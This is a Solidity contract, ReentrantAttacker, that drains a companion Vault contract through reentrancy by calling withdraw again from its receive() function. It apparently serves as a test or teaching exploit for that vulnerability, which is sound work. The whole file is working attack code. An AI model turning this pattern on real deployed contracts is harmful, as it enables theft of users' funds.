// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {Vault} from "./Vault.sol";

/// @title ReentrantAttacker
/// @notice A contract designed to exploit reentrancy vulnerabilities in the Vault contract.
/// @dev This contract attempts to withdraw funds from the Vault contract multiple times during a single transaction.
contract ReentrantAttacker {
    Vault public vault;
    bool public attackInProgress;

    /// @notice Initializes the attacker contract with the Vault instance to be exploited.
    /// @param _vault The Vault contract instance to attack.
    /// @dev Sets the vault reference and initializes attackInProgress to false.
    constructor(Vault _vault) {
        vault = _vault;
        attackInProgress = false;
    }

    /// @notice Initiates the attack by calling the Vault's withdraw function.
    /// @dev Sets attackInProgress to true and calls withdraw on the Vault with the specified
    function attack() external payable {
        attackInProgress = true;
        vault.withdraw(msg.value);
    }

    ///@notice Fallback function that is called when the Vault contract sends ether to this contract.
    /// @dev If attackInProgress is true and the Vault has sufficient balance, it attempts to withdraw 1 ether again.
    /// This creates a reentrancy attack scenario where the Vault's state is manipulated during the withdrawal process.
    /// @notice This function is payable to allow receiving
    receive() external payable {
        if (attackInProgress && address(vault).balance >= 1 ether) {
            vault.withdraw(1 ether);
        }
    }
}
